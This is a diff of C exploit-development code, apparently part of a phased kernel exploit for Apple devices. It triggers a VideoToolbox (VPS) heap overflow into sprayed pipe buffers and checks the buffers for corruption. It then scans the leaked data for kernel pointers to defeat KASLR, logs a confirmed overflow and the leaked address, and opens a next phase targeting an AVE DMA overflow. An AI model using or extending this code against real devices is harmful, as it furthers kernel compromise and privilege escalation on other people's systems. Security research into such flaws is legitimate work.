-                    for (int w = 0; w < 200 && !g_encode_done; w++) usleep(10000);
-                    if (g_cb_status == 0) encodes_ok++;
-                    else encodes_err++;
-                }
-                VTCompressionSessionCompleteFrames(enc, kCMTimePositiveInfinity);
-                rlog("  15d: ok=%d err=%d\n", encodes_ok, encodes_err);
-
-                VTCompressionSessionInvalidate(enc);
-                CFRelease(enc);
-
-                /* 15e: Check pipes for corruption */
+                /* Check pipes for corruption */
+                rlog("  Checking pipes (size=%d)...\n", psize);
                 int checked = 0, corrupted = 0;
-                for (int i = 0; i < P15_MAX_PIPES; i++) {
-                    if (p15_pipes[i][0] < 0) continue;
+                for (int i = 0; i < P15_NP; i++) {
+                    if (p15_fd[i][0] < 0) continue;
                     checked++;
-                    uint8_t *rbuf = (uint8_t *)malloc(cfg->pipe_size);
-                    ssize_t r = read(p15_pipes[i][0], rbuf, cfg->pipe_size);
-                    if (r != cfg->pipe_size) {
-                        corrupted++;
-                        rlog("  *** PIPE[%d] short read %zd ***\n", i, r);
-                    } else {
-                        uint32_t pat = 0xCA5E0000u | (uint16_t)i;
-                        int mm = 0; int first_off = -1;
-                        uint32_t first_got = 0;
-                        for (int j = 0; j < cfg->pipe_size / 4; j++) {
-                            uint32_t exp = pat ^ (uint32_t)j;
+                    uint8_t *rb = (uint8_t *)malloc(psize);
+                    ssize_t r = read(p15_fd[i][0], rb, psize);
+                    if (r == psize) {
+                        uint32_t expected = 0xCA5E0000u | (uint16_t)i;
+                        int mm = 0;
+                        int first_off = -1;
+                        for (int j = 0; j < psize / 4; j++) {
                             uint32_t got;
-                            memcpy(&got, rbuf + j * 4, 4);
-                            if (got != exp) {
-                                if (mm == 0) { first_off = j * 4; first_got = got; }
+                            memcpy(&got, rb + j * 4, 4);
+                            if (got != expected) {
+                                if (mm == 0) first_off = j * 4;
                                 mm++;
                             }
                         }
                         if (mm > 0) {
                             corrupted++;
-                            rlog("  *** PIPE[%d] CORRUPTED: %d dwords, first +%d: 0x%08x ***\n",
-                                i, mm, first_off, first_got);
-                            /* Hex dump first 64 bytes at corruption */
-                            int ds = first_off & ~0xF;
-                            for (int d = ds; d < ds + 64 && d + 16 <= cfg->pipe_size; d += 16) {
-                                rlog("    +%04x:", d);
-                                for (int b = 0; b < 16; b++) rlog(" %02x", rbuf[d + b]);
+                            p15_any_corrupt = 1;
+                            rlog("  *** PIPE[%d] CORRUPT: %d dwords at +%d ***\n",
+                                i, mm, first_off);
+                            for (int q = 0; q < psize / 8; q++) {
+                                uint64_t qw;
+                                memcpy(&qw, rb + q * 8, 8);
+                                if ((qw >> 40) == 0xfffffe) {
+                                    rlog("    KPTR +%d: 0x%016llx\n",
+                                        q * 8, (unsigned long long)qw);
+                                    if (!p15_leaked_ptr) p15_leaked_ptr = qw;
+                                }
+                            }
+                            int ds = (first_off > 16) ? first_off - 16 : 0;
+                            int de = first_off + 48;
+                            if (de > psize) de = psize;
+                            for (int d = ds; d < de; d += 16) {
+                                rlog("    %04x:", d);
+                                for (int b = 0; b < 16 && d + b < de; b++)
+                                    rlog(" %02x", rb[d + b]);
                                 rlog("\n");
                             }
                         }
                     }
-                    free(rbuf);
+                    free(rb);
                 }
-                rlog("  15e: checked=%d corrupted=%d\n", checked, corrupted);
-                if (corrupted > 0) {
-                    p15_overall_corrupted = corrupted;
-                    rlog("  *** VPS HEAP OVERFLOW DETECTED ***\n");
-                }
+                rlog("  size=%d checked=%d corrupted=%d\n", psize, checked, corrupted);
 
-                p15_cleanup_pipes:
-                for (int i = 0; i < P15_MAX_PIPES; i++) {
-                    if (p15_pipes[i][0] >= 0) {
-                        close(p15_pipes[i][0]); close(p15_pipes[i][1]);
+                p15_pipe_cleanup:
+                for (int i = 0; i < P15_NP; i++) {
+                    if (p15_fd[i][0] >= 0) {
+                        close(p15_fd[i][0]); close(p15_fd[i][1]);
                     }
                 }
                 free(p15_buf);
+                #undef P15_NP
             }
 
-            if (!p15_overall_corrupted) {
-                rlog("  No corruption across all configs.\n");
-                rlog("  VPS may not overflow into kalloc.data pipe buffers.\n");
-                rlog("  Next: try IOSurface property spray or mach msg spray.\n");
+            /* Summary */
+            if (p15_any_corrupt) {
+                rlog("*** VPS OVERFLOW CONFIRMED ***\n");
+                if (p15_leaked_ptr)
+                    rlog("*** KASLR: 0x%016llx ***\n",
+                        (unsigned long long)p15_leaked_ptr);
+            } else {
+                rlog("No pipe corruption from VPS overflow.\n");
+                rlog("VPS may not overflow, or lands in typed zone.\n");
             }
 
-            rlog("--- Phase 15 (r=229) VPS overflow complete ---\n");
+            p15_done = 1;
+            rlog("--- Phase 15 complete ---\n");
         }
 
-
-        /* ================================================================
+/* ================================================================
          * Phase 16 (r=229): AVE Temporal Layer DMA Overflow
          *
          * CVE-2026-112705: DMA mapping loop at AVE2+0x13e2e8 iterates
